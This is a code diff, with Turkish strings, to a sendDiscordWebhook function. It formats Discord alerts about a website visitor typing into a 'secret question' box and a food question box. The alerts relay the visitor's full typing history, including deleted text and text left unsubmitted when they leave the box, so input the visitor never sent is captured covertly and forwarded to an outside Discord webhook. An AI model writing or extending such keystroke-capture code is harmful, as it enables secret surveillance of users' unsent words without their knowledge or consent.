@@ -134,19 +134,19 @@ export async function sendDiscordWebhook(
     } else if (eventType === 'secret_input_typed' || eventType === 'secret_input_draft') {
       title = '✍️ Gizli Soruya Canlı Yazılıyor...';
       color = 3801080; // Sky Blue #3a86ff
-      description = `✍️ **Ziyaretçi "Ne görmek istiyorsun?" sorusuna canlı yazıyor:**\n\n**"${data.letterText || data.answer || '-'}"**\n\n🔤 **Tüm Yazılanlar (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
+      description = `✍️ **ZİYARETÇİ KUTUYA YAZIYOR / METİN DEĞİŞTİ:**\n\n🔤 **Tüm Yazılan Geçmiş (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '(Boş)'}"\n📝 **Kutuda Şu An Kalan Metin:** "${data.letterText || '(Silindi / Boş)'}"\n✂️ **Silinen Kısımlar:** "${data.deletedText || 'Yok'}"`;
     } else if (eventType === 'secret_input_unfocused') {
       title = '✍️ Ziyaretçi Yazmayı Bıraktı / Kutudan Çıktı';
       color = 16750848; // Amber Orange #fa8c16
-      description = `✍️ **Ziyaretçi yazı kutusundan çıktı (Gönder butonuna basmadı):**\n\n📝 **Kutuda Kalan Metin:** "${data.letterText || data.answer || '-'}"\n\n🔤 **Tüm Yazılanlar:** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
+      description = `✍️ **Ziyaretçi kutudan çıktı (Gönder butonuna basmadı):**\n\n🔤 **Tüm Yazılan Geçmiş (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '(Boş)'}"\n📝 **Kutuda Kalan Metin:** "${data.letterText || '(Silindi / Boş)'}"\n✂️ **Silinen Kısımlar:** "${data.deletedText || 'Yok'}"`;
     } else if (eventType === 'secret_input_submitted') {
       title = '📩 GİZLİ SORUYA CEVAP GÖNDERİLDİ!';
       color = 16723558; // Bright Crimson #ff1493
-      description = `📩 **Ziyaretçi "Ne görmek istiyorsun?" sorusuna cevabını gönderdi:**\n\n**"${data.letterText || data.answer || '-'}"**\n\n🔤 **Tüm Yazılanlar (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
+      description = `📩 **Ziyaretçi "Gönder" butonuna bastı ve cevabını gönderdi:**\n\n💬 **Gönderilen Mesaj:** "${data.letterText || data.answer || '(Boş)'}"\n🔤 **Tüm Yazılan Geçmiş (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '(Boş)'}"\n✂️ **Silinen Kısımlar:** "${data.deletedText || 'Yok'}"`;
     } else if (eventType === 'secret_input_deleted') {
-      title = '✂️ Gizli Sorudaki Yazı Silindi / Temizlendi';
+      title = '✂️ Gizli Sorudaki Yazı Silindi / Temizlendi!';
       color = 16478608; // Rose #fb7185
-      description = `✂️ **Ziyaretçi yazmış olduğu metni sildi:**\n\n✂️ **Silinen Kısım:** "${data.deletedText || '-'}"\n📝 **Kalan Metin:** "${data.letterText || '-'}"\n🔤 **Tüm Yazılanlar:** "${data.allTypedHistory || '-'}"`;
+      description = `✂️ **ZİYARETÇİ KUTUDAKİ METNİ SİLDİ / TEMİZLEDİ:**\n\n🔤 **Tüm Yazılan Geçmiş (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '(Boş)'}"\n✂️ **Son Silinen Kısım:** "${data.deletedText || '(Tüm metin silindi)'}"\n📝 **Kutuda Şu An Kalan Metin:** "${data.letterText || '(Silindi / Boş)'}"`;
     } else if (eventType === 'food_input_typed') {
       title = '💬 Yemek Kutusuna Cevap Yazıldı';
       color = 16750848; // Orange #fa8c16
